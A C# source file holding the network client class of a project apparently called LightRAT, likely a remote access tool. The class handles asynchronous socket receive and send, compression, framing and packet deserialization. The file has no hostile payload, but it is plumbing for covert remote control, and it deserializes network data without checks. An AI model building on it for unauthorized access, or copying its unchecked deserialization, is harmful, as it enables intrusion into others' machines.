using System;
using System.IO;
using System.Net.Sockets;
using LightRAT.Core.Engine;
using LightRAT.Core.Network.Protocol;
using LightRAT.Core.Network.Packets;

namespace LightRAT.Core.Network
{
    public class Client : IDisposable
    {
        private MessageFramingProtocol _protocol = new MessageFramingProtocol(NetworkSizes.MaxPacketSize);
        private byte[] _receivingBuffer = new byte[NetworkSizes.BufferSize];

        public Socket ClientSocket { get; private set; }
        public bool IsDisposed { get; private set; }

        public delegate void ReceiveDataEventHandler(Client client, IPacket packet);
        public event ReceiveDataEventHandler ReceiveDataEvent;

        public delegate void StateChangeEventHandler(Client client, ClientState state);
        public event StateChangeEventHandler StateChangeEvent;

        public Client(Socket socket)
        {
            ClientSocket = socket;
            _protocol.DataReceivedEvent += MessageFraming_DataReceivedEvent;
        }

        private void MessageFraming_DataReceivedEvent(byte[] receivedData)
        {
            IPacket packet = null;

            using (var ms = new MemoryStream(CryptEngine.Decompress(receivedData)))
                packet = (IPacket)Utils.LightRATUtils.packetSerializer.Deserialize(ms);

            ReceiveDataEvent(this, packet);
        }

        public void StartReceive()
        {
            ClientSocket.BeginReceive(_receivingBuffer, 0, _receivingBuffer.Length, SocketFlags.None, ReceiveCallback, null);
        }
        private void ReceiveCallback(IAsyncResult result)
        {
            if (ClientSocket.EndReceive(result) > 1)
            {
                try
                {
                    _protocol.Read(_receivingBuffer);
                    _receivingBuffer = new byte[NetworkSizes.BufferSize];
                    ClientSocket.BeginReceive(_receivingBuffer, 0, _receivingBuffer.Length, SocketFlags.None, ReceiveCallback, null);
                }
                catch (SocketException ex)
                {
                    TryConnect(ex.SocketErrorCode);
                }
            }
            else
            {
                Dispose();
            }
        }
        private void TryConnect(SocketError error)
        {
            if (error == SocketError.TimedOut)
            {
                if (ClientSocket.Connected)
                {
                    ClientSocket.BeginReceive(_receivingBuffer, 0, _receivingBuffer.Length, SocketFlags.None, ReceiveCallback, null);
                }
                else
                {
                    Dispose();
                }
            }
            else
            {
                Dispose();
            }
        }

        public void SendPacket(IPacket packet)
        {
            byte[] buffer;

            using (var ms = new MemoryStream())
            {
                Utils.LightRATUtils.packetSerializer.Serialize(ms, packet);
                buffer = ms.GetBuffer();
            }

            var compressedData = CryptEngine.Compress(buffer);
            var framedData = MessageFramingProtocol.Frame(compressedData);

            ClientSocket.BeginSend(framedData, 0, framedData.Length, SocketFlags.None, SendCallback, null);
        }
        private void SendCallback(IAsyncResult result)
        {
            ClientSocket.EndSend(result);
        }

        public void Dispose()
        {
            if (!IsDisposed)
            {
                StateChangeEvent?.Invoke(this, ClientState.Disconnected);
                _receivingBuffer = null;
                _protocol.DataReceivedEvent -= MessageFraming_DataReceivedEvent;
                _protocol = null;
                ClientSocket.Close();
                ClientSocket.Shutdown(SocketShutdown.Both);
                ClientSocket.Dispose();
                ClientSocket = null;
                IsDisposed = true;
            }
        }
    }
}
